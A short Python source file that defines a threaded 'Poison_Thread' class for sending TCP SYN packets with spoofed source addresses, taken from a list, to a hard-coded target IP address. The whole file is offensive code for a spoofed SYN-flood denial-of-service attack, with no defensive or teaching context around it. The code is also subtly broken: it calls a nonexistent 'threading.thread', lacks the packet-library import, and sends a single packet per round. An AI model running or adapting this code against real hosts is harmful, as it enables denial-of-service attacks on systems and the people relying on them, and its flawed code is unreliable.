import threading

class Poison_Thread(threading.thread):
    global ip_list
    def __init__(self):
        super(Poison_Thread,self).__init__()
        self.stopped=False
    def run(self):
        def attack(url='67.229.142.4'):
            packet=IP(src=ip_list,dst=url)/TCP(flags='S')
            print 'start a round'
            send(packet)
        sub=threading.Thread(target=attack,args=())
        sub.setDaemon(True)
        sub.start()

        while not self.stopped:
            sub.join(1)
    def stop(self):
        self.stopped=True
